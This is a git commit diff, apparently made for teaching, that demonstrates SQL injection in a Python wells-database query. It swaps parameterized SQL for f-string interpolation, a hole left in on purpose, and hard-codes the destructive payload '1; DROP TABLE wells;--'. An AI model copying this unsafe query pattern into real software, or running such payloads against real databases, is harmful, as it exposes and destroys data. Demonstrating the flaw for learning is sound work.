a8db812ed045dab604a9df3138b3cbff9f440b58
xofbd <dfox09@gmail.com>
2022-01-26 14:41:25 -0500

    Demonstrate SQL injection attack

--- app/database.py
+++ app/database.py
@@ -1,7 +1,7 @@
 import os
 
 from dotenv import load_dotenv
-from sqlalchemy import create_engine, text
+from sqlalchemy import create_engine
 
 load_dotenv()
 URL_DB = os.getenv('URL_DB')
@@ -11,18 +11,18 @@ def query_db(depth_min, grad_min):
     """Return wells that fit the search criteria."""
     engine = create_engine(URL_DB)
 
-    query = text(
-        """
+    query = f"""
         SELECT latitude, longitude, depth, gradient
         FROM wells
-        WHERE depth > :depth_min AND gradient > :grad_min;
+        WHERE depth > {depth_min} AND gradient > {grad_min};
         """
-    )
+
+    print(query)
 
     with engine.connect() as conn:
         results = (
             conn
-            .execute(query, depth_min=depth_min, grad_min=grad_min)
+            .execute(query)
             .fetchall()
         )
 
@@ -30,9 +30,7 @@ def query_db(depth_min, grad_min):
 
 
 if __name__ == '__main__':
-    import sys
-
-    depth_min = float(sys.argv[1])
-    grad_min = float(sys.argv[2])
+    depth_min = '1; DROP TABLE wells;--'
+    grad_min = 0.05
 
     print(query_db(depth_min, grad_min))
